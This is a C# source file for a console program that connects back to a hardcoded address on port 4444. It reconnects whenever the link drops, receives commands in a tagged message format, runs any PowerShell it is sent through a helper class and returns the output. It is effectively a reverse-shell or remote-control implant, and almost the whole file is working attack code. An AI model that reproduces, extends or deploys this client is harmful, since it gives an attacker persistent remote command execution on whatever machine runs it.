using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Globalization;
using System.Text.RegularExpressions;

namespace myclient
{
    
    class MyApp
    {
        private string t_message = "";

        public static IPEndPoint CreateIPEndPoint(string endPoint)
        {
            string[] ep = endPoint.Split(':');
            if (ep.Length != 2) throw new FormatException("Invalid endpoint format");
            IPAddress ip;
            if (!IPAddress.TryParse(ep[0], out ip))
            {
                throw new FormatException("Invalid ip-adress");
            }
            int port;
            if (!int.TryParse(ep[1], NumberStyles.None, NumberFormatInfo.CurrentInfo, out port))
            {
                throw new FormatException("Invalid port");
            }
            return new IPEndPoint(ip, port);
        }


        public static string MsgPack(string Msg_In)
        {
            string MsgTag_St = "[MYMSST]";
            string MsgTag_Ed = "[MYMSED]";

            return MsgTag_St + Msg_In + MsgTag_Ed;
        }

        public string doRecive(Socket socket) //assume connected
        {
            byte[] bytes = new byte[1024];
            string MsgTag_St = "[MYMSST]";
            string MsgTag_Ed = "[MYMSED]";


            while (true)
            {
                //Console.WriteLine("[DEBUG] " + t_message);
                //Console.WriteLine("[DEBUG] " + t_message.IndexOf(MsgTag_St));
                //Console.WriteLine("[DEBUG] " + t_message.IndexOf(MsgTag_Ed));

                if (t_message.IndexOf(MsgTag_St) >= 0 && t_message.IndexOf(MsgTag_Ed) >= 0)
                {
                    int st_tag = t_message.IndexOf(MsgTag_St);
                    int ed_tag = t_message.IndexOf(MsgTag_Ed);
                    string r_msg = t_message.Substring(st_tag + MsgTag_St.Length, ed_tag - (st_tag + MsgTag_St.Length));
                    //Console.WriteLine("[DEBUG] r_msg: " + r_msg);
                    t_message = t_message.Substring(ed_tag + MsgTag_Ed.Length);
                    //Console.WriteLine("[DEBUG] t_message: " + t_message);
                    //Console.WriteLine("[DEBUG] r_msg: " + r_msg);
                    return r_msg;
                }
                else
                {
                    Console.WriteLine("[DEBUG] Need to get more ....");
                    int bytesRec = socket.Receive(bytes);
                    t_message = t_message + Encoding.ASCII.GetString(bytes, 0, bytesRec);

                }
            }
        }

        public void StartClient()
        {
            // Data buffer for incoming data.  
            byte[] bytes = new byte[1024];
            string command_tag;
            string command;

            //init
            PsRun myPsRun = new PsRun();
            myPsRun.init();


            //COMMAND_SUCCESS
            //COMMAND_TAG_SUCCESS
            //PSRUN_SUCCESS


            // Connect to a remote device.  
            try
            {

                IPEndPoint remoteEP = CreateIPEndPoint("192.168.182.131:4444");

                // Create a TCP/IP  socket.  
                Socket sender = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);


                // Connect the socket to the remote endpoint. Catch any errors.  
                try
                {
                    sender.Connect(remoteEP);
                    Console.WriteLine("Socket connected to {0}", sender.RemoteEndPoint.ToString());
                    while (true)
                    {

                        try
                        {
                            Console.WriteLine("Waiting for command tag ...");

                            //int bytesRec = sender.Receive(bytes);
                            //command_tag = Encoding.ASCII.GetString(bytes, 0, bytesRec);
                            command_tag = doRecive(sender);
                            //Console.WriteLine("Recieved Command tag: {0}", command_tag);
                            byte[] msg = Encoding.ASCII.GetBytes(MsgPack("COMMAND_TAG_SUCCESS"));
                            int bytesSent = sender.Send(msg);
                            if (bytesSent != msg.Length)
                            {
                                Console.WriteLine("[DEBUG] Something wrong with send");
                            }

                            Console.WriteLine("Finished sending ACK tag");

                            Console.WriteLine("Trying to get commands ... ");
                            //bytesRec = sender.Receive(bytes);
                            //command = Encoding.ASCII.GetString(bytes, 0, bytesRec);
                            command = doRecive(sender);
                            //Console.WriteLine("Recieved Command: {0}", command);
                            msg = Encoding.ASCII.GetBytes(MsgPack("COMMAND_SUCCESS"));
                            bytesSent = sender.Send(msg);
                            if (bytesSent != msg.Length)
                            {
                                Console.WriteLine("[DEBUG] Something wrong with send");
                            }


                            //check command
                            if (command_tag.ToLower() == "ps" || command_tag.ToLower() == "powershell")
                            {

                                string psresult = "";
                                try
                                {
                                    psresult = myPsRun.doPsRun(command);
                                }
                                catch (Exception e)
                                {

                                    psresult = psresult + "[ERROR]: " + e.Message;
                                }


                                Console.WriteLine("[DEBUG] cmd executed ...");
                                msg = Encoding.ASCII.GetBytes(MsgPack(psresult));
                                bytesSent = sender.Send(msg);
                                if (bytesSent != msg.Length)
                                {
                                    Console.WriteLine("[DEBUG] Something wrong with send");
                                }
                                Console.WriteLine("Send result finished");

                                //get success ack
                                //bytesRec = sender.Receive(bytes);
                                //string psAck = Encoding.ASCII.GetString(bytes, 0, bytesRec);
                                string psAck = doRecive(sender);
                                Console.WriteLine("[DEBUG] ACK msg: " + psAck);
                                if (psAck == "PSRUN_SUCCESS")
                                {
                                    Console.WriteLine("[PsRun] Success");
                                }
                                else
                                {
                                    Console.WriteLine("[PsRun] Failed ...");
                                }

                            }


                            if (command_tag.ToLower() == "exit")
                            {
                                break;
                            }
                        }

                        catch (SocketException se)
                        {
                            Console.WriteLine("SocketException : {0}", se.ToString());
                            //keep reconnect
                            while (true)
                            {
                                try
                                {
                                    sender = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                                    sender.Connect(remoteEP);
                                    break;
                                }
                                catch (SocketException se_inner)
                                {
                                    Console.WriteLine("Keep trying ...");
                                }
                            }
                        }
                    }//end of while 


                    // Release the socket.  
                    sender.Shutdown(SocketShutdown.Both);
                    sender.Close();

                }//outer try

                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }

            }//init try
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }
    }
    
    class Program
    {

        static void Main(string[] args)
        {
            MyApp t_app = new MyApp();
            t_app.StartClient();
        }
    }
}

